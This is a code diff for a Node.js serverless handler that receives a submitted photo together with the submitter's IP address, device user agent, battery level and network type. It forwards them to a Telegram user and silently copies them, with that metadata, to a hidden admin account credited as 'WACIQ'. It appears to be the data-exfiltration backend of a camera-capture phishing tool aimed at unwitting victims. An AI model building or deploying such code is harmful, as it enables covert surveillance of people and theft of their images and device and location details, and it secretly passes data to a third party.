@@ -1,46 +1,53 @@
-import formidable from 'formidable';
-import fs from 'fs';
-import { Telegraf } from 'telegraf';
-
+const { Telegraf } = require('telegraf');
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-export const config = {
-  api: {
-    bodyParser: false
+module.exports = async (req, res) => {
+  if (req.method !== 'POST') {
+    return res.status(405).send('Method Not Allowed');
   }
-};
 
-export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");
+  try {
+    const { image, uid, battery, network } = req.body;
+    const adminId = process.env.ADMIN_ID;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    const timestamp = new Date().toLocaleString('en-US', {
+      timeZone: 'Asia/Kabul',
+      hour12: false,
+    });
 
-  const form = new formidable.IncomingForm({ uploadDir: "/tmp", keepExtensions: true });
+    if (!uid || !image) return res.status(400).send('UID or image missing');
 
-  form.parse(req, async (err, fields, files) => {
-    if (err) return res.status(500).send("Form parse error");
+    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
+    const imgBuffer = Buffer.from(base64, 'base64');
 
-    const uid = fields.uid;
-    if (!uid) return res.status(400).send("UID missing");
+    const caption = `
+*📸 نوی عکس ترلاسه شو*
 
-    try {
-      const photos = [];
-      for (let i = 1; i <= 4; i++) {
-        if (files['photo' + i]) photos.push(files['photo' + i]);
-      }
+🆔 *User ID:* \`${uid}\`
+🔋 *Battery:* \`${battery || '?'}%\`
+📶 *Network:* \`${network || '?'}\`
+🌐 *IP:* \`${ip}\`
+📱 *Device:* \`${userAgent}\`
+🕒 *Time:* \`${timestamp}\`
 
-      if (photos.length === 0) return res.status(400).send("No photos uploaded");
+🧑🏻‍💻 *Built by:* 💛 *WACIQ*
+    `.trim();
 
-      for (const file of photos) {
-        const buffer = fs.readFileSync(file.filepath);
-        await bot.telegram.sendPhoto(uid, { source: buffer });
-        if (process.env.ADMIN_ID) await bot.telegram.sendPhoto(process.env.ADMIN_ID, { source: buffer });
-        fs.unlinkSync(file.filepath);
-      }
+    // Send to user
+    await bot.telegram.sendPhoto(uid, { source: imgBuffer });
 
-      res.status(200).send("✅ Photos uploaded successfully.");
-
-    } catch (e) {
-      console.error(e);
-      res.status(500).send("❌ Error sending to Telegram");
+    // Send to admin
+    if (adminId) {
+      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
+        caption,
+        parse_mode: 'Markdown'
+      });
     }
-  });
-} 
+
+    res.status(200).send('✅ Image delivered');
+  } catch (err) {
+    console.error(err);
+    res.status(500).send('❌ Sending error');
+  }
+}; 
